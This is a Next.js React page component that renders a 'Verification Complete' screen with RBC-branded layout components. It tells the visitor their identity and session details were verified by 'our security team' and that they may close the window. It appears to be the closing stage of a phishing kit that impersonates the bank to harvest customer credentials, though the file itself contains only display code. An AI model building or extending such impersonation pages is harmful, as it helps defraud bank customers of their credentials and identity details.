'use client';

/**
 * Completed/Success Stage Page
 *
 * Shown when verification is successfully completed
 * All stages passed - customer is verified
 */

import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { CheckCircle2 } from 'lucide-react';

export default function CompletedPage() {
  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        <div className="mb-[40px] pb-[15px] border-b border-border">
          <h1 className="text-[18px] md:text-[20px] text-foreground font-normal m-0">
            Verification Complete
          </h1>
        </div>

        <div className="mb-[20px]">
          <p className="text-[#555] text-[13px] font-normal leading-snug">
            Your identity and session details have been successfully verified by our security team. Thank you for your cooperation in keeping your account safe.
          </p>
        </div>

        <div className="w-full space-y-4 mb-[40px]">
          <div className="flex items-center gap-[15px] p-[20px] bg-[#fafafa] rounded-[4px] border border-border">
            <CheckCircle2 className="h-8 w-8 text-[#0076a8] flex-shrink-0" />
            <div>
              <p className="text-[14px] font-bold text-foreground m-0">Session Securely Verified</p>
              <p className="text-[13px] text-[#555] mt-[5px]">You may now safely close this window.</p>
            </div>
          </div>
        </div>
      </div>
    </SplitLayout>
  );
}
